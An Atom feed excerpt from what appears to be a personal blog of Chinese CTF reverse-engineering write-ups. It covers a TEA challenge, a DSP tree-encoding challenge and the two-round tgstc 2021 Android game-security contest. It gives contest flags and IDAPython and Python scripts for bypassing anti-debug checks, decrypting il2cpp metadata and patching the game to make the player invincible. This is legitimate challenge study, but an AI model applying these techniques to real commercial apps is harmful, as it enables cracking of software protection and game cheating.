    <content type="html"><![CDATA[<p>津门杯和红帽杯左右开弓，有点难受。</p><h2 id="GoodRe"><a href="#GoodRe" class="headerlink" title="GoodRe"></a>GoodRe</h2><p>主要逻辑很简单，静态看不太容易看明白但是动态分析很容易。</p><img src="/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/image-20210514213723121.png" class="" title="image-20210514213723121"><p>前面一部分是把输入简单分割生成的数组，还有一个常量数组。</p><p>之后四个相同的函数不知道在干什么</p><p>进去看看</p><img src="/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/image-20210514215231664.png" class="" title="image-20210514215231664"><span id="more"></span><p>动调到sub_*8667的时候看到0x9e3779b9。加上后面的4,5,4,5。基本实锤tea加密。</p><p>明文是输入，密钥就是之前的常量，加密后比较，直接解密即可。</p><p>flag{7dea3f6d3b3d6c0c620864add2fa2ae1a61f2736f0060da0b97e8356d017ce59}</p><h2 id="babydsp"><a href="#babydsp" class="headerlink" title="babydsp"></a>babydsp</h2><p>玄学TMS320C6架构（ida认的</p><p>看strings找到</p><img src="/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/image-20210514215856231.png" class="" title="image-20210514215856231"><p>很像flag经过某种变换得到的，让我回想起之前做过的一个riscv架构的题。（后来发现两个题一模一样</p><p>然后后面有调试信息，大概手动恢复出来一部分的数据结构和函数调用关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">g_stack</span><br><span class="line">g_sp</span><br><span class="line">g_weight</span><br><span class="line">g_idx</span><br><span class="line">tree_list</span><br><span class="line">g_nodinfo_idx</span><br><span class="line">fd</span><br><span class="line">buf</span><br><span class="line">pos</span><br><span class="line">bufend</span><br><span class="line">buff_stop</span><br><span class="line">flags</span><br><span class="line">FILE</span><br><span class="line"></span><br><span class="line">struct Node&#123;</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct NodeInfo&#123;</span><br><span class="line">node</span><br><span class="line">depth</span><br><span class="line">weight</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">init_statk() &#123;</span><br><span class="line">memset()</span><br><span class="line">&#125;</span><br><span class="line">mynodecalloc() &#123;</span><br><span class="line">exit()</span><br><span class="line">memset()</span><br><span class="line">memset()</span><br><span class="line">&#125;</span><br><span class="line">mynodeinfocalloc() &#123;</span><br><span class="line">exit()</span><br><span class="line">memset()</span><br><span class="line">memset()</span><br><span class="line">&#125;</span><br><span class="line">build_tree(tree_list, node) &#123;</span><br><span class="line">mynodecalloc()</span><br><span class="line">build_tree()</span><br><span class="line">&#125;</span><br><span class="line">push_node(nodeinfo) &#123;&#125;</span><br><span class="line">pop_node() &#123;&#125;</span><br><span class="line">calc_weight(node) &#123;</span><br><span class="line"></span><br><span class="line">node.depth = i</span><br><span class="line">node.node = B5</span><br><span class="line">node.weight = 0x31*i + X</span><br><span class="line"></span><br><span class="line">push_node()</span><br><span class="line">mynodeinfocalloc()</span><br><span class="line">push_node()</span><br><span class="line">pop_node()</span><br><span class="line">&#125;</span><br><span class="line">check_weight(weight, len) &#123;</span><br><span class="line">&#125;</span><br><span class="line">check_password(password, length) &#123;</span><br><span class="line">memset()</span><br><span class="line">check_weight()</span><br><span class="line">check_weight()</span><br><span class="line">&#125;</span><br><span class="line">main() &#123;</span><br><span class="line">init_stack()</span><br><span class="line">printf()</span><br><span class="line">fgets()</span><br><span class="line">build_tree()</span><br><span class="line">build_tree()</span><br><span class="line">calc_weight()</span><br><span class="line">check_password()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有build_tree的操作，那一长串的字符就是一棵树的先序遍历。</p><p>然后github上找到一个dump_coff的工具，ida插件会爆炸，不过使用它的dump工具手动修复一下ida的偏移还是基本能认出来。</p><p>根据之前分析的函数调用关系找到check_weight函数</p><img src="/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/image-20210514220501200.png" class="" title="image-20210514220501200"><p>传入了一个数组和大量的常数进行比较。</p><p>再看calc_weight</p><img src="/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/image-20210514220642455.png" class="" title="image-20210514220642455"><p><img src="/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/image-20210514220710614.png" alt="image-20210514220710614"></p><p>基本能看出来的是一个0x31或者0x30乘上节点的深度。大概就能脑补出来具体的加密流程了。</p><p>之前生成的树上每个节点对应唯一的weight，weight计算如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weight[i] = weight[i.parent] + i.depth * ([i是左儿子]?0x31:0x30)</span><br></pre></td></tr></table></figure><p>根据比较的常量表到树上去取出来节点就是flag</p><p>flag{JUst_a_babyyyy_DsP_rEveRse}</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;津门杯和红帽杯左右开弓，有点难受。&lt;/p&gt;
&lt;h2 id=&quot;GoodRe&quot;&gt;&lt;a href=&quot;#GoodRe&quot; class=&quot;headerlink&quot; title=&quot;GoodRe&quot;&gt;&lt;/a&gt;GoodRe&lt;/h2&gt;&lt;p&gt;主要逻辑很简单，静态看不太容易看明白但是动态分析很容易。&lt;/p&gt;
&lt;img src=&quot;/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/image-20210514213723121.png&quot; class=&quot;&quot; title=&quot;image-20210514213723121&quot;&gt;

&lt;p&gt;前面一部分是把输入简单分割生成的数组，还有一个常量数组。&lt;/p&gt;
&lt;p&gt;之后四个相同的函数不知道在干什么&lt;/p&gt;
&lt;p&gt;进去看看&lt;/p&gt;
&lt;img src=&quot;/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/image-20210514215231664.png&quot; class=&quot;&quot; title=&quot;image-20210514215231664&quot;&gt;</summary>
    
    
    
    
    <category term="逆向" scheme="https://ihopenot.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>tgstc-2021-Android-复赛</title>
    <link href="https://ihopenot.github.io/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/"/>
    <id>https://ihopenot.github.io/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/</id>
    <published>2021-04-18T03:24:34.000Z</published>
    <updated>2023-08-24T14:58:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="寻找游戏逻辑代码"><a href="#寻找游戏逻辑代码" class="headerlink" title="寻找游戏逻辑代码"></a>寻找游戏逻辑代码</h3><p>​上手发现是个unity游戏，首先找Assembly-Csharp.dll，没有，是个il2cpp打包了的游戏。那就找il2cpp.dll和global-metadata。找到了，但是都被加密了。</p><p>​那么现在要做的有il2cpp.dll的解密和global-metadata的解密。</p><p>​il2cpp.dll解密估计在libsec2021里，当然也可以直接dump，global-metadata可以动调断在il2cpp里跟或者直接GG搜内存dump。</p><h3 id="去除反调试"><a href="#去除反调试" class="headerlink" title="去除反调试"></a>去除反调试</h3><p>​考虑到之后还要修改，去除反调试应该是难以避免的。</p><p>​打开就看到和初赛一样一样的字符串加解密算法，但是全部内联到了程序里面。</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418113812036.png" class="" title="image-20210418113812036"><p>​之前的方法不太好处理，也懒得分析它的算法，暂时先不管。</p><span id="more"></span><p>​打开调试器启动，准备找下它的反调试的核心函数，发现自杀的代码基本长一个样。</p><p>​<img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418113936238.png" class="" title="image-20210418113936238"></p><p>​通过异或产生一个不合法地址然后跳过去。可以用IDApython批量下断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_maybe_bad</span>(<span class="params">start, end</span>):</span><br><span class="line">    inst = start</span><br><span class="line">    <span class="keyword">while</span> inst &lt; end:</span><br><span class="line">        <span class="keyword">if</span> GetDisasm(inst).startswith(<span class="string">&quot;EOR&quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> GetDisasm(next_head(inst)).startswith(<span class="string">&quot;BLX&quot;</span>):</span><br><span class="line">                bpaddr = next_head(inst)</span><br><span class="line">                add_bpt(bpaddr)</span><br><span class="line">                ida_dbg.disable_bpt(bpaddr)</span><br><span class="line">        inst = next_head(inst)</span><br></pre></td></tr></table></figure><p>​可以断下来接近60个地方。。。看了下反调会影响函数流程，也不敢轻易乱改，只能让它跑起来再把撞上的断点一个个手动修了，肉眼看到的有检测ida和frida的文件和端口，手动过一下这些反调可以让你在程序里少patch几个地方。。。</p><p>​最后只需要手动改不到10个地方就可以绕过反调了。</p><p>​其实更应该去找上层一点反调试代码，比如启动反调试线程的地方，但是程序本身大量混淆非常难看，找起来很麻烦。</p><p>​混淆类似ollvm的那种，感觉要去的话angr也挺好去的，符号执行到块结尾看BLX到哪里去，分支代码特征也很明显，都是ADDNE, MOVEQ这类的指令（口胡。</p><h3 id="解密libunity和libil2cpp"><a href="#解密libunity和libil2cpp" class="headerlink" title="解密libunity和libil2cpp"></a>解密libunity和libil2cpp</h3><p>​有了上面的工作理论上已经可以调试了，但是实际上跑起来会死在libunity里面，而且跟过去也发现全是乱的，估计是libsec2021中用了校验码之类的东西去解密libunity.so，因为我们的patch导致解密失败，解出来的东西自然全是屎。</p><p>​手动跟下libunity的init_proc，发现最终解密函数也是在libsec2021中。</p><p>​而且发现这个地方很可疑。</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418115606025.png" class="" title="image-20210418115606025"><p>​其中用到的值被放在堆里，其指针放在</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418115720432.png" class="" title="image-20210418115720432"><p>​怀疑是key，直接GG挂上去看正常运行时的值，手动填进去试试，发现跑起来了。</p><p>​解密程序其中取出了2个dword，但只使用了它们的异或值，所以这样patch程序也没问题：</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418120014139.png" class="" title="image-20210418120014139"><p>​</p><p>​好了，到这一步已经可以畅通无阻调试了。</p><h3 id="恢复global-metadata"><a href="#恢复global-metadata" class="headerlink" title="恢复global-metadata"></a>恢复global-metadata</h3><p>​直接从内存中dump出来il2cpp.dll。global-metadata在il2cpp.so中下断后dump出来，断在下图第一个函数：</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418120251841.png" class="" title="image-20210418120251841"><p>​丢到il2cppDumper，报错了，也算意料之中。</p><p>​找原因东找找西找找，最后对着源码看了下后面</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418120555605.png" class="" title="image-20210418120555605"><p>​偏移对不上，错位了。然后对着源码一个区段一个区段看，最后发现是把开头的3个string相关的区段挪到了中间去，所以其他区段全错位了，而且字符串区段还被加密了，加密就是个异或。</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418121226886.png" class="" title="image-20210418121226886"><p>​写个python脚本手动修了下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">opart = []</span><br><span class="line">part = [<span class="number">0</span>]</span><br><span class="line">head = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">buf</span>):</span><br><span class="line">ret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(buf)):</span><br><span class="line"><span class="keyword">if</span> buf[i] == <span class="number">0</span>:</span><br><span class="line">ret += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">v = (i&amp;<span class="number">0x7f</span>) ^ (buf[i] - <span class="number">0x7f</span>) ^ <span class="number">0x5c</span></span><br><span class="line">ret += <span class="built_in">bytes</span>([v])</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;gmdata&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">raw = f.read()</span><br><span class="line">head = raw[:<span class="number">8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">offset = u32(raw[i*<span class="number">8</span>+<span class="number">8</span>: i*<span class="number">8</span>+<span class="number">12</span>])</span><br><span class="line">count = u32(raw[i*<span class="number">8</span>+<span class="number">12</span>: i*<span class="number">8</span>+<span class="number">16</span>])</span><br><span class="line">part.append(raw[offset: offset+count])</span><br><span class="line"></span><br><span class="line">opart.append(part[<span class="number">23</span>])</span><br><span class="line">opart.append(part[<span class="number">24</span>])</span><br><span class="line">opart.append(dec(part[<span class="number">25</span>]))</span><br><span class="line">opart = opart + part[<span class="number">1</span>:<span class="number">23</span>] + part[<span class="number">26</span>:]</span><br><span class="line"></span><br><span class="line">nowoff = <span class="number">0x110</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opart:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(i))</span><br><span class="line">head += p32(nowoff)</span><br><span class="line">head += p32(<span class="built_in">len</span>(i))</span><br><span class="line">nowoff += <span class="built_in">len</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opart:</span><br><span class="line">head += i</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;fixMeta&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(head)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​修复出来还是报错，手动跟il2cppDumper的源码调试，发现它有个区段认错了，怀疑是版本号有问题，因为这个区段在版本27中是没有的，手动把版本号改成24，成功dump出Assembly-Csharp.dll文件。</p><h3 id="修改无敌版"><a href="#修改无敌版" class="headerlink" title="修改无敌版"></a>修改无敌版</h3><p>​剩下的工作就很简单了，用ida脚本恢复出来符号信息，找到关键函数。</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418121246747.png" class="" title="image-20210418121246747"><p>​判断是否障碍物</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418121305171.png" class="" title="image-20210418121305171"><p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418121337792.png" alt="image-20210418121337792"></p><p>​因为没有分析加解密具体算法，所以这里使用自修改的patch，修改libsec2021中的解密代码，让它解密结束之后将将对应位置改掉。</p><img src="/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418121510954.png" class="" title="image-20210418121510954">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;h3 id=&quot;寻找游戏逻辑代码&quot;&gt;&lt;a href=&quot;#寻找游戏逻辑代码&quot; class=&quot;headerlink&quot; title=&quot;寻找游戏逻辑代码&quot;&gt;&lt;/a&gt;寻找游戏逻辑代码&lt;/h3&gt;&lt;p&gt;​	上手发现是个unity游戏，首先找Assembly-Csharp.dll，没有，是个il2cpp打包了的游戏。那就找il2cpp.dll和global-metadata。找到了，但是都被加密了。&lt;/p&gt;
&lt;p&gt;​	那么现在要做的有il2cpp.dll的解密和global-metadata的解密。&lt;/p&gt;
&lt;p&gt;​	il2cpp.dll解密估计在libsec2021里，当然也可以直接dump，global-metadata可以动调断在il2cpp里跟或者直接GG搜内存dump。&lt;/p&gt;
&lt;h3 id=&quot;去除反调试&quot;&gt;&lt;a href=&quot;#去除反调试&quot; class=&quot;headerlink&quot; title=&quot;去除反调试&quot;&gt;&lt;/a&gt;去除反调试&lt;/h3&gt;&lt;p&gt;​	考虑到之后还要修改，去除反调试应该是难以避免的。&lt;/p&gt;
&lt;p&gt;​	打开就看到和初赛一样一样的字符串加解密算法，但是全部内联到了程序里面。&lt;/p&gt;
&lt;img src=&quot;/2021/04/18/tgstc-2021-Android-%E5%A4%8D%E8%B5%9B/image-20210418113812036.png&quot; class=&quot;&quot; title=&quot;image-20210418113812036&quot;&gt;

&lt;p&gt;​	之前的方法不太好处理，也懒得分析它的算法，暂时先不管。&lt;/p&gt;</summary>
    
    
    
    
    <category term="逆向" scheme="https://ihopenot.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>tgstc-2021-Android-初赛</title>
    <link href="https://ihopenot.github.io/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/"/>
    <id>https://ihopenot.github.io/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/</id>
    <published>2021-04-18T02:32:49.000Z</published>
    <updated>2023-08-24T14:57:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="寻找Assembly-Csharp"><a href="#寻找Assembly-Csharp" class="headerlink" title="寻找Assembly-Csharp"></a>寻找Assembly-Csharp</h3><p>​上手看了下，是个unity写的游戏，那么找游戏逻辑首先要考虑的就是Assembly-Csharp.dll，找到之后丢到dnspy，发现打不开，用010Editor打开一看。</p><img src="/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418103735471.png" class="" title="image-20210418103735471"><p>​明显是被加密了，大量的0xAF，怀疑全文异或0xAF，异或之后发现还有些0xC2，0xC3有问题，这些是由于编码问题，python脚本恢复后用dnspy打开。</p><p>​<img src="/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418104119614.png" class="" title="image-20210418104119614"></p><p>​能反编译了，但是细看发现里面的东西不对劲，很少，不像真正的游戏代码。</p><p>​那估计是在mono加载的地方动了手脚，接下来想办法从这里入手。</p><span id="more"></span><h3 id="去除反调试"><a href="#去除反调试" class="headerlink" title="去除反调试"></a>去除反调试</h3><p>​为了方便的断在mono_image_open_from_data_with_name，这里选择干掉程序中的反调试代码。</p><p>​检测到调试会有弹窗 “hack detected”</p><p>​JAVA层里没有什么特别的东西。</p><p>​重点分析libsec2021.so，发现大量的字符串信息被加密了，通过一个函数解密并返回字符串。</p><img src="/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418110552236.png" class="" title="image-20210418110552236"><p>​使用IDApython脚本主动调用解密，并批量标注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line">stringTable = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">active_get_res_by_index</span>(<span class="params">func_ea, index</span>):</span><br><span class="line">    cpu.r0 = index</span><br><span class="line">    oldlr = cpu.lr</span><br><span class="line">    oldr0 = cpu.r0</span><br><span class="line"></span><br><span class="line">    add_bpt(cpu.pc)</span><br><span class="line"></span><br><span class="line">    cpu.lr = cpu.pc</span><br><span class="line">    cpu.pc = func_ea</span><br><span class="line"></span><br><span class="line">    idaapi.continue_process()</span><br><span class="line">    wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    ret = cpu.r0</span><br><span class="line">    cpu.r0 = oldr0</span><br><span class="line">    cpu.lr = oldlr</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for arm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">active_get_res</span>(<span class="params">func_ea, <span class="built_in">max</span> = <span class="number">1000000</span></span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt;= <span class="built_in">max</span>:</span><br><span class="line">        <span class="built_in">print</span>(idx)</span><br><span class="line">        straddr = active_get_res_by_index(func_ea, idx)</span><br><span class="line">        size = idaapi.get_byte(straddr - <span class="number">1</span>)</span><br><span class="line">        s = get_bytes(straddr, size)</span><br><span class="line">        <span class="built_in">print</span>(idx, s)</span><br><span class="line">        stringTable[idx] = s</span><br><span class="line">        idx += size+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResArg</span>(<span class="params">inst</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> GetDisasm(inst).startswith(<span class="string">&quot;MOV&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> idc.print_operand(inst, <span class="number">0</span>) == <span class="string">&quot;R0&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> get_operand_type(inst, <span class="number">1</span>) == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auto_mark</span>(<span class="params">func_ea</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> idautils.CodeRefsTo(func_ea, <span class="number">0</span>):</span><br><span class="line">        bpaddr = i</span><br><span class="line">        inst = idc.prev_head(i)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> getResArg(inst):</span><br><span class="line">            inst = idc.prev_head(inst)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(GetDisasm(inst))</span><br><span class="line"></span><br><span class="line">        idx = <span class="built_in">int</span>(idc.print_operand(inst, <span class="number">1</span>)[<span class="number">1</span>:], <span class="number">16</span>)</span><br><span class="line">        add_bpt(bpaddr)</span><br><span class="line">        ida_dbg.disable_bpt(bpaddr)</span><br><span class="line">        set_bpt_cond(bpaddr, <span class="string">&#x27;print(&quot;&#x27;</span>+stringTable[idx]+<span class="string">&#x27;&quot;)&#x27;</span>)</span><br><span class="line">        set_cmt(bpaddr, stringTable[idx], <span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​效果：</p><img src="/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418111134486.png" class="" title="image-20210418111134486"><p>​找“hack detected”字符串找到反调试自杀的地方</p><img src="/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418111325809.png" class="" title="image-20210418111325809"><p>​交叉引用往上跟下发现最原始是这个地方</p><img src="/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418111433478.png" class="" title="image-20210418111433478"><p>​找它的交叉引用找到反调试代码全部过掉，大概patch了6个地方。</p><p>​就可以正常调试了。</p><h3 id="再寻Assembly-Csharp"><a href="#再寻Assembly-Csharp" class="headerlink" title="再寻Assembly-Csharp"></a>再寻Assembly-Csharp</h3><p>​断在libmono.so的open_image里面，发现又调用了libsec2021中的一个函数</p><img src="/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418111835765.png" class="" title="image-20210418111835765"><p>​如果文件名是Assembly-Csharp.dll，就从sec2021.png后截取后部分解密传入mono_image_open_from_data_with_name。</p><p>​这里已经很明显了，外面的Assembly-Csharp是个假的，真的藏在图片里。</p><p>​解密也就是个简单的异或解密。</p><p>​至此就拿到了真实的Assembly-Csharp.dll</p><h3 id="修改无敌版"><a href="#修改无敌版" class="headerlink" title="修改无敌版"></a>修改无敌版</h3><p>​剩下的工作就很简单了，丢到dnspy里找到关键逻辑，patch之后重加密丢回图片里完事。</p><p>​关键函数（修改后）</p><img src="/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418112300008.png" class="" title="image-20210418112300008">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;h3 id=&quot;寻找Assembly-Csharp&quot;&gt;&lt;a href=&quot;#寻找Assembly-Csharp&quot; class=&quot;headerlink&quot; title=&quot;寻找Assembly-Csharp&quot;&gt;&lt;/a&gt;寻找Assembly-Csharp&lt;/h3&gt;&lt;p&gt;​	上手看了下，是个unity写的游戏，那么找游戏逻辑首先要考虑的就是Assembly-Csharp.dll，找到之后丢到dnspy，发现打不开，用010Editor打开一看。&lt;/p&gt;
&lt;img src=&quot;/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418103735471.png&quot; class=&quot;&quot; title=&quot;image-20210418103735471&quot;&gt;

&lt;p&gt;​	明显是被加密了，大量的0xAF，怀疑全文异或0xAF，异或之后发现还有些0xC2，0xC3有问题，这些是由于编码问题，python脚本恢复后用dnspy打开。&lt;/p&gt;
